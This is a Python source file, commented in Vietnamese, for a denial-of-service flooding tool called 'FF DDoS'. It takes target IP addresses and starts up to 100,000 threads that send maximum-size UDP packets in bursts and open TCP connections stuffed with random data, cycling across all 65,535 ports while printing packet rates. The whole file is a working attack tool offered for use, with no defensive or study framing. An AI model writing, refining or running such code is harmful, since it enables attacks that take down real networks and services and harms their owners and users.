# ============================================
# FF DDoS - KHÔNG FAKE - SỨC MẠNH THẬT
# BỎ HẾT GIẢ MẠO - CHỈ TẬP TRUNG VÀO TỐC ĐỘ
# GỬI GÓI THẬT - NHIỀU - NHANH - LIÊN TỤC
# ============================================

import socket
import time
import threading
import os
import random
import sys
import multiprocessing
from datetime import datetime

# ============================================
# CẤU HÌNH TỐI ĐA - KHÔNG GIẢ MẠO
# ============================================
BURST_SIZE = 1000          # Gửi 1000 gói/lần
PAYLOAD_SIZE = 65507       # Gói UDP tối đa
SOCKET_POOL_SIZE = 500     # 500 socket dùng chung
PROCESS_COUNT = multiprocessing.cpu_count()  # Dùng hết CPU

# ============================================
# TẤT CẢ PORT - TỪ 1 ĐẾN 65535
# ============================================
ALL_PORTS = list(range(1, 65536))

class RawPowerEngine:
    """Engine thuần túy - chỉ có sức mạnh"""
    
    def __init__(self):
        self.targets = []
        self.running = False
        self.packets = 0
        self.errors = 0
        self.connections = 0
        self.lock = threading.Lock()
        self.udp_pool = []
        self.pool_lock = threading.Lock()
    
    def inc(self, n=1):
        with self.lock: self.packets += n
    def inc_conn(self):
        with self.lock: self.connections += 1
    def err(self):
        with self.lock: self.errors += 1
    def get(self):
        with self.lock: return self.packets, self.errors, self.connections
    
    def _init_pool(self):
        """Tạo sẵn socket pool - tránh mở/đóng liên tục"""
        for _ in range(SOCKET_POOL_SIZE):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
                s.settimeout(0.01)
                self.udp_pool.append(s)
            except:
                pass
    
    def _get_sock(self):
        with self.pool_lock:
            if self.udp_pool:
                s = self.udp_pool.pop(0)
                self.udp_pool.append(s)
                return s
        return None
    
    def _udp_worker(self, tid):
        """UDP Flood - KHÔNG FAKE - GỬI THẲNG"""
        s = self._get_sock()
        if s is None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
                s.settimeout(0.01)
            except:
                return
        
        # Payload cố định - tạo 1 lần
        payload = os.urandom(PAYLOAD_SIZE)
        targets = self.targets
        ports = ALL_PORTS
        idx = tid
        
        while self.running:
            try:
                ip = targets[idx % len(targets)]
                port = ports[idx % len(ports)]
                idx += 1
                
                # BURST 1000 GÓI 1 LẦN
                for _ in range(BURST_SIZE):
                    s.sendto(payload, (ip, port))
                    self.inc()
                    
            except:
                self.err()
        
        s.close()
    
    def _tcp_worker(self, tid):
        """TCP SYN Flood - KHÔNG FAKE - KẾT NỐI THẬT"""
        idx = tid
        
        while self.running:
            s = None
            try:
                ip = self.targets[idx % len(self.targets)]
                port = ALL_PORTS[idx % len(ALL_PORTS)]
                idx += 1
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
                s.settimeout(0.01)
                s.connect_ex((ip, port))
                s.send(os.urandom(65535))  # Gửi max data
                self.inc()
                self.inc_conn()
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass
    
    def start(self, targets, total_threads, udp_pct, tcp_pct):
        """Khởi động engine"""
        if self.running:
            self.stop()
            time.sleep(0.2)
        
        if not targets:
            return 0, 0, 0
        
        self.targets = targets
        self.running = True
        self.packets = 0
        self.errors = 0
        self.connections = 0
        
        self._init_pool()
        
        total_threads = max(1000, min(total_threads, 100000))
        
        udp_n = int(total_threads * udp_pct / 100)
        tcp_n = int(total_threads * tcp_pct / 100)
        
        created = 0
        
        # Tạo UDP threads
        for i in range(udp_n):
            t = threading.Thread(target=self._udp_worker, args=(i,), daemon=True)
            t.start()
            created += 1
            if created % 2000 == 0:
                print(f"\r  [⏳] {created}/{total_threads} threads...", end='')
        
        # Tạo TCP threads
        for i in range(tcp_n):
            t = threading.Thread(target=self._tcp_worker, args=(i,), daemon=True)
            t.start()
            created += 1
            if created % 2000 == 0:
                print(f"\r  [⏳] {created}/{total_threads} threads...", end='')
        
        print(f"\r  [✅] {created} THREADS ĐÃ KHỞI ĐỘNG!    ")
        return created, udp_n, tcp_n
    
    def stop(self):
        self.running = False
        for s in self.udp_pool:
            try: s.close()
            except: pass
        self.udp_pool.clear()


def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║  ☠ FF DDoS - RAW POWER - NO FAKE ☠           ║
    ║  {PAYLOAD_SIZE}B PAYLOAD | {BURST_SIZE}x BURST                ║
    ║  {SOCKET_POOL_SIZE} SOCKETS | 65535 PORTS                  ║
    ║  KHÔNG GIẢ MẠO - CHỈ CÓ SỨC MẠNH THẬT         ║
    ╚══════════════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    # IP
    if len(sys.argv) > 1:
        ip_input = sys.argv[1]
        print(f"  [+] IP: {ip_input}")
    else:
        print("  [+] NHẬP IP MỤC TIÊU:")
        ip_input = input("  >> ").strip()
    
    if not ip_input:
        print("  [-] CHƯA NHẬP IP!")
        return
    
    targets = [t.strip() for t in ip_input.replace(',', ' ').split() if t.strip()]
    if not targets:
        print("  [-] KHÔNG CÓ IP!")
        return
    
    # Threads
    if len(sys.argv) > 2:
        threads = int(sys.argv[2])
        print(f"  [+] Threads: {threads}")
    else:
        print(f"\n  [+] SỐ THREADS:")
        print(f"      1000-5000: Mạnh")
        print(f"      5000-20000: Rất mạnh")
        print(f"      20000-50000: Siêu mạnh")
        print(f"      50000-100000: MAX POWER")
        try:
            threads = int(input("  >> ").strip() or "5000")
        except:
            threads = 5000
    
    threads = max(1000, min(threads, 100000))
    
    # Chế độ
    print(f"\n  [+] CHẾ ĐỘ:")
    print(f"      1. UDP MAX (100% UDP)")
    print(f"      2. UDP 90% + TCP 10%")
    print(f"      3. UDP 70% + TCP 30%")
    print(f"      4. UDP 50% + TCP 50%")
    mode = input("  >> ").strip() or "1"
    
    if mode == "1": udp_pct, tcp_pct = 100, 0
    elif mode == "2": udp_pct, tcp_pct = 90, 10
    elif mode == "3": udp_pct, tcp_pct = 70, 30
    elif mode == "4": udp_pct, tcp_pct = 50, 50
    else: udp_pct, tcp_pct = 100, 0
    
    print(f"\n  [☠] KHỞI ĐỘNG {threads} THREADS...")
    print(f"  [📊] UDP: {udp_pct}% | TCP: {tcp_pct}%")
    print(f"  [🎯] {len(targets)} IP | [🔌] 1-65535 PORTS")
    print(f"  [💣] {PAYLOAD_SIZE}B PAYLOAD | {BURST_SIZE}x BURST")
    print(f"  [⚡] KHÔNG FAKE - SỨC MẠNH THẬT")
    print(f"\n  CTRL+C = DỪNG\n")
    
    engine = RawPowerEngine()
    total, udp_n, tcp_n = engine.start(targets, threads, udp_pct, tcp_pct)
    
    if not total:
        print("  [-] LỖI!")
        return
    
    start_time = time.time()
    
    try:
        last_p = 0
        last_t = time.time()
        
        while engine.running:
            p, e, c = engine.get()
            now = time.time()
            elapsed = now - start_time
            dt = now - last_t
            dp = p - last_p
            
            pps = dp / dt if dt > 0 else 0
            avg_pps = p / elapsed if elapsed > 0 else 0
            
            last_p = p
            last_t = now
            
            m, s = divmod(int(elapsed), 60)
            h, m = divmod(m, 60)
            
            if h > 0:
                ts = f"{h}h{m:02d}p{s:02d}s"
            else:
                ts = f"{m:02d}p{s:02d}s"
            
            print(f"\r  [📊] GÓI: {p:,} | {pps:,.0f}/s | TB: {avg_pps:,.0f}/s | CONN: {c:,} | LỖI: {e} | {ts}  ", end='')
            time.sleep(0.2)
            
    except KeyboardInterrupt:
        print("\n\n  [⏹] ĐANG DỪNG...")
    
    engine.stop()
    time.sleep(0.3)
    
    p, e, c = engine.get()
    elapsed = time.time() - start_time
    avg_pps = p / elapsed if elapsed > 0 else 0
    m, s = divmod(int(elapsed), 60)
    h, m = divmod(m, 60)
    
    if h > 0:
        ts = f"{h}h{m:02d}p{s:02d}s"
    else:
        ts = f"{m:02d}p{s:02d}s"
    
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║           KẾT THÚC                               ║
    ╠══════════════════════════════════════════════════╣
    ║  TIME:     {ts:>36}  ║
    ║  GÓI:      {p:>36,}  ║
    ║  TỐC ĐỘ TB:{avg_pps:>36,.0f}/s  ║
    ║  KẾT NỐI:  {c:>36,}  ║
    ║  LỖI:      {e:>36,}  ║
    ║  THREADS:  {total:>36,}  ║
    ╚══════════════════════════════════════════════════╝
    """)

if __name__ == '__main__':
    main()
